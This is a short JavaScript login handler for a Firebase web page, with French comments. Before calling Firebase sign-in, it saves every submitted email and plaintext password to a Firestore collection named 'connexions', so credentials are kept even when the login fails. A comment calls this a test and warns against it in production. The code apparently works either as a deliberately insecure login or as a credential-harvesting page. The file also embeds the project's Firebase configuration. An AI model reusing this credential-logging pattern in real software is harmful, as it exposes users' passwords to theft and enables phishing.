// Importer les modules Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

// Configuration Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDx-LqtPc6MNauyOBww-GYMXMkUmFQVa2k",
  authDomain: "page-de-connexion-f5f19.firebaseapp.com",
  projectId: "page-de-connexion-f5f19",
  storageBucket: "page-de-connexion-f5f19.appspot.com", // Correction ici !
  messagingSenderId: "657832256354",
  appId: "1:657832256354:web:7163ed93c42c627d1a823b",
  measurementId: "G-4K7RJQVVWL"
};

// ✅ Initialiser Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app); 

// ✅ Gérer la soumission du formulaire de connexion
document.getElementById('login-form').addEventListener('submit', async function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();

  // Vérification basique des champs
  if (email === "" || password === "") {
    alert("Veuillez remplir tous les champs !");
    return;
  }

  try {
    // ⚠️ Enregistrement des informations de connexion dans Firestore (juste pour test)
    const docRef = await addDoc(collection(db, "connexions"), {
      email: email,
      password: password, // ⚠️ En production, ne jamais stocker le mot de passe en clair !
      timestamp: new Date()
    });

    console.log("Connexion enregistrée avec ID : ", docRef.id);
    alert("Connexion enregistrée avec succès !");

    // Authentifier l'utilisateur
    const userCredential = await signInWithEmailAndPassword(auth, email, password);
    const user = userCredential.user;

    alert("Bienvenue, " + user.email);
    window.location.href = "accueil.html"; // Redirection après connexion réussie

  } catch (error) {
    console.error("Erreur : ", error.message);
    alert("Erreur : " + error.message);
  }
});